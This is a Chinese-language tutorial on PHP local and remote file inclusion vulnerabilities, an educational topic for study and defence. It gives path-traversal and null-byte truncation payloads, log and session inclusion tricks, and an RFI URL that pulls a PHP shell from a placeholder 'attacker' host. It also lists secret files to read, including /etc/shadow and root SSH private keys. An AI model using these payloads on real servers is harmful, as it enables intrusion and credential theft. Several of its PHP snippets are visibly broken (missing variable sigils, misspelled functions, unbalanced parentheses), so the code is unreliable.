# 文件包含介绍

严格来说，文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。

代码注入的典型代表就是文件包含。文件包含可能会出现在JSP、PHP、ASP等语言中。

常见的导致文件包含的函数如下：

- PHP: include(), include_once(), require(),require_once, fopen(), readfile() ….
- JSP/Servlet: ava.io.File(),java.io.FileReader() …
- ASP:include file, include virtual…                    

 PHP文件包含主要由这四个函数完成：

- include()
- require()
- include_once()
- require_once()

当使用这4个函数包含一个新的文件时，**该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型**。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。

 

比如DVWA low等级的文件上传

```php
<?php include($_GET[page]);?>
```

 

在同目录留一个包含了可执行的PHP代码的txt文件

![img](file:///C:/Users/Dhakkan/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

再执行漏洞URL，发现代码被执行了

![img](file:///C:/Users/Dhakkan/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

 

要成功的利用文件包含漏洞，需要满足下面两个条件：

- `include（）`等函数通过动态变量的方式引入需要包含的文件
- 用户能够控制该动态变量



下面我们深入看看文件包含漏洞还能导致哪些后果

# 本地文件包含

## 普通本地文件包含

能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion/LFI）。比如下面这段代码就存在LFI漏洞。

```php
<?php
file = _GET[‘file’];      // “../../etc/passwd\0
If (file_exisits(‘/home/wwwrun/’.$file.’.php’)) {
  //file_exists will return true as the file/home/wwwrun/../../etc/passwd exists
  Include‘/home/wwwrun/’.$file.’.php’;
  // the file /etc/passwd will be included
}
?>
```



用户能够控制参数file。当file的值为`../../etc/passwd`时，PHP将访问`/etc/passwd`文件。

 

但是在此之前，还需要解决`Include‘/home/wwwrun/’.$file.’.php’;`

这种写法将变量与字符串连接起来，假如用户控制$file的值为`../../etc/passwd`，这段代码相当于`Include‘/home/wwwrun/../../etc/passwd.php’;`

被包含的文件实际上是`/etc/passwd.php`，但是实际上这个文件是不存在的

## 有限制的本地文件包含

### %00截断

PHP内核是由C语言实现的，因此使用了C语言中 的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，只要在最后加入一个0字节，就能截断file变量之后的字符串，即

`../../etc/passwd\0`

在Web输入时只需URL编码一下，变成

`../../etc/passwd%00`

 (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)

### %00截断目录遍历

`?file=../../../../../../../../../var/www/%00`

(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)

### 防御%00截断

在一般的Web应用中，0字节是用户不需要的，因此可以完全禁用0字节，比如：

```php
<?php
function getVar($name){
  value =isset(GET[name] ? GET[$name] : null;
  if(is_string($value)){
    value= str_replace(“\0”, ‘ ‘ , value);
  }
}
?>
```



### 构造长目录截断

但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。

**目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。**

而只需通过【./】就可以构造出足够长的目录。比如

`././././././././././././././././passwd`

或者

`////////////////////////passwd`

又或者

`../1/abc/../1/abc/../1/abc..`

 (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)

### 点号截断

`?file=../../../../../../../../../boot.ini/………[…]…………`

(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

## 普通远程文件包含

如果PHP的配置选项allow_url_include为ON的话（默认是关闭的），则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI）

例如：

```php
<?php
if($route == "share"){
  require_once $basePath .'/action/m_share.php';
}
elseif($route == "sharelink"){
  require_once $basePath ./'action/m_sharelink.php';
}
?>
```

在$basePath前没有设置任何障碍，因此攻击者可以构造类似如下的恶意URL：

```
/?param=http://attacker/phpshell.txt?
```

最终加载的代码实际上执行了：

```
require_once 'http://attacker/phpshell.txt?/action/m_share.php';
```

问号后面的代码最终被解释成URL的querystring（查询用字符串）,这也算一种截断方式，这是利用远程文件包含漏洞时的常见技巧。同样，%00也可以作为截断符号。



## 本地文件包含的利用技巧

本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件

经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。

（1）包含用户上传的文件

（2）包含data://或php://input等伪协议

（3）包含session文件

（4）包含日志文件

（5）包含/proc/self/environ

（6）包含上传的临时文件

（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析

### 常见利用方式

`<?phpinclude("inc/" . $_GET['file']); ?>`

- 包含同目录下的文件：

`?file=.htaccess`

- 目录遍历：

`?file=../../../../../../../../../var/lib/locate.db`

`?file=../../../../../../../../../var/lib/mlocate/mlocate.db`

（linux中这两个文件储存着所有文件的路径，需要root权限）

- 包含错误日志：
  `?file=../../../../../../../../../var/log/apache/error.log` 
  （试试把UA设置为“”来使payload进入日志）

- 获取web目录或者其他配置文件：

`?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf`

- 包含上传的附件：

`?file=../attachment/media/xxx.file`

- 读取session文件：

`?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7`

（session文件一般在`/tmp`目录下，格式为`sess_[your phpsessid value]`，有时候也有可能在`/var/lib/php5`之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）

- 如果拥有root权限还可以试试读这些东西：

`/root/.ssh/authorized_keys`

`/root/.ssh/id_rsa`

`/root/.ssh/id_rsa.keystore`

`/root/.ssh/id_rsa.pub`

`/root/.ssh/known_hosts`

`/etc/shadow`

`/root/.bash_history`

`/root/.mysql_history`

`/proc/self/fd/fd[0-9]* (文件标识符)`

`/proc/mounts`

`/proc/config.gz`

- 如果有phpinfo可以包含临时文件：

参见http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el


